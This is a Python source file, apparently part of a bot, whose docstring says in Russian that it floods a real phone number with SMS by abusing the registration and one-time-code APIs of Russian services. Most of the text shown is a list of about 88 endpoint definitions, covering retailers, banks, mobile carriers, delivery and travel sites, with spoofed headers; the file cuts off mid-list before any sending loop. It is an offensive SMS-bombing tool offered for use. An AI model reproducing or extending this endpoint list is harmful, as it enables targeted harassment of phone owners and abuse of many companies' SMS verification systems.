"""
Brown V2 | sms_snos.py
Метод: SMS флуд на реальный номер телефона через регистрационные API российских сервисов
- 70+ эндпоинтов российских сервисов
- Асинхронные запросы через aiohttp (пачками по 10)
- Лог-файл после завершения
"""

import asyncio
import json
import os
import random
import string
import time

import aiohttp
from utils import now_msk

LOG_FOLDER = "logs"
os.makedirs(LOG_FOLDER, exist_ok=True)

TIMEOUT = 10
BATCH_SIZE = 10

bot = None


def set_bot_sms(b):
    global bot
    bot = b


def _rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def _rand_email():
    return f"{_rand_str(8)}@{_rand_str(5)}.ru"


def _rand_name():
    names = ["Иван", "Алексей", "Дмитрий", "Сергей", "Андрей", "Михаил", "Павел", "Николай", "Артём", "Денис"]
    return random.choice(names)


def _rand_lastname():
    lastnames = ["Иванов", "Петров", "Сидоров", "Смирнов", "Козлов", "Новиков", "Морозов", "Попов", "Лебедев", "Соколов"]
    return random.choice(lastnames)


def _build_services(phone: str) -> list[dict]:
    """
    Возвращает список сервисов.
    Каждый элемент: {name, method, url, headers, data/json, success_codes}
    phone — в формате 79991234567 (без +)
    """
    phone_plus = f"+{phone}"
    phone_7 = phone if phone.startswith("7") else f"7{phone}"
    phone_8 = f"8{phone[1:]}" if phone.startswith("7") else phone
    email = _rand_email()
    fname = _rand_name()
    lname = _rand_lastname()

    services = [
        # ── 1. Wildberries ──────────────────────────────────────────────────
        {
            "name": "Wildberries",
            "method": "POST",
            "url": "https://user-order.wildberries.ru/api/v2/auth/login",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            },
            "json": {"phone": int(phone_7), "deviceId": _rand_str(16)},
            "success_codes": [200, 204, 400],
        },
        # ── 2. Ozon ─────────────────────────────────────────────────────────
        {
            "name": "Ozon",
            "method": "POST",
            "url": "https://api.ozon.ru/composer-api.bx/page/json/v2?url=%2Fapi%2Fentrypoint-api.bx%2Fpage%2Fjson%2Fv2",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "x-o3-app-name": "ozonapp_android",
                "x-o3-app-version": "18.0.0(2300)",
                "x-o3-device-type": "mobile",
            },
            "json": {
                "url": "/api/composer-api.bx/page/json/v2?url=/accounts/",
                "params": {"phone": phone_plus},
            },
            "success_codes": [200, 400],
        },
        # ── 3. DNS-shop ─────────────────────────────────────────────────────
        {
            "name": "DNS",
            "method": "POST",
            "url": "https://www.dns-shop.ru/user/send-otp/",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
                "X-Requested-With": "XMLHttpRequest",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 400, 422],
        },
        # ── 4. Citilink ─────────────────────────────────────────────────────
        {
            "name": "Citilink",
            "method": "POST",
            "url": "https://www.citilink.ru/api/login/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "X-Requested-With": "XMLHttpRequest",
            },
            "json": {"phone": phone_plus, "agree": True},
            "success_codes": [200, 400],
        },
        # ── 5. Citilink v2 ──────────────────────────────────────────────────
        {
            "name": "Citilink v2",
            "method": "POST",
            "url": "https://www.citilink.ru/auth/phone/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400, 422],
        },
        # ── 6. Raiffeisen ───────────────────────────────────────────────────
        {
            "name": "Raiffeisen",
            "method": "POST",
            "url": "https://sso.raiffeisen.ru/auth/realms/Retail/login-actions/authenticate",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 302, 400],
        },
        # ── 7. PizzaHut ─────────────────────────────────────────────────────
        {
            "name": "PizzaHut",
            "method": "POST",
            "url": "https://api.pizzahut.ru/v1/auth/phone/send-otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 201, 400],
        },
        # ── 8. CIAN ─────────────────────────────────────────────────────────
        {
            "name": "CIAN",
            "method": "POST",
            "url": "https://api.cian.ru/api/auth/v1/get-code-by-phone/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 9. Letu (Л'Этуаль) ──────────────────────────────────────────────
        {
            "name": "Letu",
            "method": "POST",
            "url": "https://letu.ru/api/v1/auth/send-otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 10. Eldorado ────────────────────────────────────────────────────
        {
            "name": "Eldorado",
            "method": "POST",
            "url": "https://www.eldorado.ru/api/login/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "X-Requested-With": "XMLHttpRequest",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 11. DG-Home ─────────────────────────────────────────────────────
        {
            "name": "DG-Home",
            "method": "POST",
            "url": "https://dg-home.ru/local/ajax/sms.php",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 400],
        },
        # ── 12. Orby ────────────────────────────────────────────────────────
        {
            "name": "Orby",
            "method": "POST",
            "url": "https://orby-brand.ru/ajax/otpAction.php",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}&action=send",
            "success_codes": [200, 400],
        },
        # ── 13. Profi.ru ────────────────────────────────────────────────────
        {
            "name": "Profi.ru",
            "method": "POST",
            "url": "https://profi.ru/api/login/phone/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 14. ABC.ru ──────────────────────────────────────────────────────
        {
            "name": "ABC.ru",
            "method": "POST",
            "url": "https://abc.ru/api/v1/user/auth/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 15. Sberhealth ──────────────────────────────────────────────────
        {
            "name": "Sberhealth",
            "method": "POST",
            "url": "https://api.sberhealth.ru/auth/v1/send-otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 16. 1cupis ──────────────────────────────────────────────────────
        {
            "name": "1cupis",
            "method": "POST",
            "url": "https://1cupis.ru/api/user/sms/code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 17. Gulliver ────────────────────────────────────────────────────
        {
            "name": "Gulliver",
            "method": "POST",
            "url": "https://gullivermarket.com/personal/sms-login/",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 400],
        },
        # ── 18. Mosmetro ────────────────────────────────────────────────────
        {
            "name": "Mosmetro",
            "method": "POST",
            "url": "https://login.mosmetro.ru/auth/v1/phone/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 19. Uteka ───────────────────────────────────────────────────────
        {
            "name": "Uteka",
            "method": "POST",
            "url": "https://uteka.ru/api/user/sms/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 20. Madyart ─────────────────────────────────────────────────────
        {
            "name": "Madyart",
            "method": "POST",
            "url": "https://madyart.ru/ajax/sms.php",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 400],
        },
        # ── 21. Evraz ───────────────────────────────────────────────────────
        {
            "name": "Evraz",
            "method": "POST",
            "url": "https://evraz.com/api/auth/send-code/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 22. Winelab ─────────────────────────────────────────────────────
        {
            "name": "Winelab",
            "method": "POST",
            "url": "https://winelab.ru/api/v2/auth/login/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 23. OK.ru ───────────────────────────────────────────────────────
        {
            "name": "OK.ru",
            "method": "POST",
            "url": "https://ok.ru/api/auth/login",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 400],
        },
        # ── 24. ВкусВилл ────────────────────────────────────────────────────
        {
            "name": "ВкусВилл",
            "method": "POST",
            "url": "https://api.vkusvill.ru/api/v2/user/send-code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_7},
            "success_codes": [200, 400],
        },
        # ── 25. Яндекс.Еда ──────────────────────────────────────────────────
        {
            "name": "Яндекс.Еда",
            "method": "POST",
            "url": "https://eda.yandex.ru/api/v1/auth/request-code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 26. Delivery Club ────────────────────────────────────────────────
        {
            "name": "DeliveryClub",
            "method": "POST",
            "url": "https://api.delivery-club.ru/api11/auth",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "X-Version": "11.0.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 27. Додо Пицца ───────────────────────────────────────────────────
        {
            "name": "Dodo Pizza",
            "method": "POST",
            "url": "https://auth.dodois.io/connect/token",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"grant_type=phone&phone={phone_plus}&platform=web&countryCode=ru",
            "success_codes": [200, 400],
        },
        # ── 28. Burger King ──────────────────────────────────────────────────
        {
            "name": "Burger King",
            "method": "POST",
            "url": "https://burgerking.ru/api/v1/sms/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 29. KFC ─────────────────────────────────────────────────────────
        {
            "name": "KFC",
            "method": "POST",
            "url": "https://api.kfc.com/api/auth/v1/phone/otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "X-RBI-Version": "7.3.4",
            },
            "json": {"phone": phone_plus, "countryCode": "RU"},
            "success_codes": [200, 400],
        },
        # ── 30. Самокат ──────────────────────────────────────────────────────
        {
            "name": "Самокат",
            "method": "POST",
            "url": "https://api.samokat.ru/v1/auth/send-code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 31. Яндекс.Маркет ────────────────────────────────────────────────
        {
            "name": "Яндекс.Маркет",
            "method": "POST",
            "url": "https://market.yandex.ru/api/checkout/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 32. Мегафон ──────────────────────────────────────────────────────
        {
            "name": "Мегафон",
            "method": "POST",
            "url": "https://api.megafon.ru/auth/v1/send-otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"msisdn": phone_7},
            "success_codes": [200, 400],
        },
        # ── 33. Билайн ───────────────────────────────────────────────────────
        {
            "name": "Билайн",
            "method": "POST",
            "url": "https://my.beeline.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_7},
            "success_codes": [200, 400],
        },
        # ── 34. МТС ──────────────────────────────────────────────────────────
        {
            "name": "МТС",
            "method": "POST",
            "url": "https://api.mts.ru/auth/v2/send-code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 35. Теле2 ────────────────────────────────────────────────────────
        {
            "name": "Теле2",
            "method": "POST",
            "url": "https://mapi.tele2.ru/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 36. Avito ────────────────────────────────────────────────────────
        {
            "name": "Avito",
            "method": "POST",
            "url": "https://api.avito.ru/core/v1/accounts/phone/login",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 37. HeadHunter ───────────────────────────────────────────────────
        {
            "name": "HeadHunter",
            "method": "POST",
            "url": "https://hh.ru/oauth/token/phone",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}&client_id=HH&grant_type=phone_verification",
            "success_codes": [200, 400],
        },
        # ── 38. Ленточка / Лента ─────────────────────────────────────────────
        {
            "name": "Лента",
            "method": "POST",
            "url": "https://lenta.com/api/v1/user/send-sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 39. Перекрёсток ──────────────────────────────────────────────────
        {
            "name": "Перекрёсток",
            "method": "POST",
            "url": "https://www.perekrestok.ru/api/customer/v2/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_7},
            "success_codes": [200, 400],
        },
        # ── 40. Пятёрочка ────────────────────────────────────────────────────
        {
            "name": "Пятёрочка",
            "method": "POST",
            "url": "https://www.pyaterochka.ru/api/customer/v2/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_7},
            "success_codes": [200, 400],
        },
        # ── 41. М.Видео ──────────────────────────────────────────────────────
        {
            "name": "М.Видео",
            "method": "POST",
            "url": "https://www.mvideo.ru/bff/mobile/auth/otp/send",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 42. Газпромбанк ──────────────────────────────────────────────────
        {
            "name": "Газпромбанк",
            "method": "POST",
            "url": "https://online.gazprombank.ru/auth/v1/sms/send",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 43. Росбанк ──────────────────────────────────────────────────────
        {
            "name": "Росбанк",
            "method": "POST",
            "url": "https://rosbank.ru/api/auth/v1/send-sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 44. ПСБ ──────────────────────────────────────────────────────────
        {
            "name": "ПСБ",
            "method": "POST",
            "url": "https://ib.psbank.ru/api/auth/v2/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 45. Ренессанс ────────────────────────────────────────────────────
        {
            "name": "Ренессанс",
            "method": "POST",
            "url": "https://api.rencredit.ru/auth/v1/otp/send",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 46. Совкомбанк ───────────────────────────────────────────────────
        {
            "name": "Совкомбанк",
            "method": "POST",
            "url": "https://sovcombank.ru/api/v1/sms/send",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 47. ДомКлик ──────────────────────────────────────────────────────
        {
            "name": "ДомКлик",
            "method": "POST",
            "url": "https://domclick.ru/api/v2/user/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 48. Lamoda ───────────────────────────────────────────────────────
        {
            "name": "Lamoda",
            "method": "POST",
            "url": "https://api.lamoda.ru/api/v5/user/sendAuthCode",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 49. Золотое Яблоко ───────────────────────────────────────────────
        {
            "name": "Золотое Яблоко",
            "method": "POST",
            "url": "https://goldapple.ru/api/v1/auth/send-code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 50. Rendez-Vous ──────────────────────────────────────────────────
        {
            "name": "Rendez-Vous",
            "method": "POST",
            "url": "https://rendez-vous.ru/api/v1/user/sms/auth",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 51. FixPrice ─────────────────────────────────────────────────────
        {
            "name": "FixPrice",
            "method": "POST",
            "url": "https://fix-price.com/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 52. Детский мир ──────────────────────────────────────────────────
        {
            "name": "Детский мир",
            "method": "POST",
            "url": "https://www.detmir.ru/api/v1/auth/phone/otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 53. Снежная Королева ─────────────────────────────────────────────
        {
            "name": "Снежная Королева",
            "method": "POST",
            "url": "https://snkol.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 54. Магнит ───────────────────────────────────────────────────────
        {
            "name": "Магнит",
            "method": "POST",
            "url": "https://magnit.ru/api/v2/auth/login/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 55. Ашан ─────────────────────────────────────────────────────────
        {
            "name": "Ашан",
            "method": "POST",
            "url": "https://www.auchan.ru/api/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 56. СберМаркет ───────────────────────────────────────────────────
        {
            "name": "СберМаркет",
            "method": "POST",
            "url": "https://sbermarket.ru/api/v3/auth/sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 57. Лабиринт ─────────────────────────────────────────────────────
        {
            "name": "Лабиринт",
            "method": "POST",
            "url": "https://www.labirint.ru/ajax/auth/phone/",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            "data": f"phone={phone_plus}",
            "success_codes": [200, 400],
        },
        # ── 58. Book24 ───────────────────────────────────────────────────────
        {
            "name": "Book24",
            "method": "POST",
            "url": "https://book24.ru/api/v1/auth/send-code/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 59. Читай-город ──────────────────────────────────────────────────
        {
            "name": "Читай-город",
            "method": "POST",
            "url": "https://www.chitai-gorod.ru/api/v1/auth/send-code/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 60. Apteka.ru ────────────────────────────────────────────────────
        {
            "name": "Apteka.ru",
            "method": "POST",
            "url": "https://api.apteka.ru/Account/Phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 61. 36.6 ─────────────────────────────────────────────────────────
        {
            "name": "36.6",
            "method": "POST",
            "url": "https://apteki.366.ru/api/v2/auth/phone/send-otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 62. СДЭК ─────────────────────────────────────────────────────────
        {
            "name": "СДЭК",
            "method": "POST",
            "url": "https://api.cdek.ru/v2/oauth/token/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 63. Boxberry ─────────────────────────────────────────────────────
        {
            "name": "Boxberry",
            "method": "POST",
            "url": "https://api.boxberry.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 64. Яндекс.Такси ─────────────────────────────────────────────────
        {
            "name": "Яндекс.Такси",
            "method": "POST",
            "url": "https://taxi-authproxy.taxi.yandex.net/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 65. Wheely ───────────────────────────────────────────────────────
        {
            "name": "Wheely",
            "method": "POST",
            "url": "https://wheely.com/api/2/auth/send_code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 66. SkiPass ──────────────────────────────────────────────────────
        {
            "name": "SkiPass",
            "method": "POST",
            "url": "https://skipassmarket.ru/api/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 67. Fotosklad ────────────────────────────────────────────────────
        {
            "name": "Fotosklad",
            "method": "POST",
            "url": "https://www.fotosklad.ru/api/v1/sms-auth/",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 68. ВсеИнструменты ───────────────────────────────────────────────
        {
            "name": "ВсеИнструменты",
            "method": "POST",
            "url": "https://www.vseinstrumenti.ru/api/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 69. Леруа Мерлен ─────────────────────────────────────────────────
        {
            "name": "Леруа Мерлен",
            "method": "POST",
            "url": "https://leroymerlin.ru/api/v2/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 70. Петрович ─────────────────────────────────────────────────────
        {
            "name": "Петрович",
            "method": "POST",
            "url": "https://petrovich.ru/api/v1/auth/sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 71. Ikea ─────────────────────────────────────────────────────────
        {
            "name": "IKEA",
            "method": "POST",
            "url": "https://www.ikea.com/ru/ru/customer/auth/v1/phone/code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 72. Hoff ─────────────────────────────────────────────────────────
        {
            "name": "Hoff",
            "method": "POST",
            "url": "https://hoff.ru/api/v2/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 73. Домодедово ───────────────────────────────────────────────────
        {
            "name": "Домодедово",
            "method": "POST",
            "url": "https://dme.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 74. РЖД ──────────────────────────────────────────────────────────
        {
            "name": "РЖД",
            "method": "POST",
            "url": "https://lk.rzd.ru/api/v1/auth/phone/otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 75. Аэрофлот ─────────────────────────────────────────────────────
        {
            "name": "Аэрофлот",
            "method": "POST",
            "url": "https://www.aeroflot.ru/api/auth/send-otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 76. Туту.ру ──────────────────────────────────────────────────────
        {
            "name": "Туту.ру",
            "method": "POST",
            "url": "https://www.tutu.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 77. OnlineTours ──────────────────────────────────────────────────
        {
            "name": "OnlineTours",
            "method": "POST",
            "url": "https://www.onlinetours.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 78. Яндекс.Путешествия ───────────────────────────────────────────
        {
            "name": "Яндекс.Путешествия",
            "method": "POST",
            "url": "https://travel.yandex.ru/api/v1/user/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 79. Instamart ────────────────────────────────────────────────────
        {
            "name": "Instamart",
            "method": "POST",
            "url": "https://api.instmart.ru/v4/login",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 80. СберПрайм ────────────────────────────────────────────────────
        {
            "name": "СберПрайм",
            "method": "POST",
            "url": "https://sberprime.sber.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 81. Кинопоиск ────────────────────────────────────────────────────
        {
            "name": "Кинопоиск",
            "method": "POST",
            "url": "https://api.kinopoisk.ru/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 82. Иви ──────────────────────────────────────────────────────────
        {
            "name": "Иви",
            "method": "POST",
            "url": "https://api.ivi.ru/mobileapi/user/auth/v7",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus, "type": "sms"},
            "success_codes": [200, 400],
        },
        # ── 83. More.tv ──────────────────────────────────────────────────────
        {
            "name": "More.tv",
            "method": "POST",
            "url": "https://more.tv/api/v4/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 84. Okko ─────────────────────────────────────────────────────────
        {
            "name": "Okko",
            "method": "POST",
            "url": "https://okko.tv/api/v3/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 85. Яндекс.Музыка ────────────────────────────────────────────────
        {
            "name": "Яндекс.Музыка",
            "method": "POST",
            "url": "https://music.yandex.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 86. Ростелеком ───────────────────────────────────────────────────
        {
            "name": "Ростелеком",
            "method": "POST",
            "url": "https://lk.rt.ru/api/auth/v2/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 87. 2ГИС ─────────────────────────────────────────────────────────
        {
            "name": "2ГИС",
            "method": "POST",
            "url": "https://account.2gis.ru/v1/auth/phone/otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 88. Calltouch ────────────────────────────────────────────────────
        {
            "name": "Calltouch",
            "method": "POST",
            "url": "https://app.calltouch.ru/auth/v1/phone",
            "headers": {
                "Content-Type": "application/json",
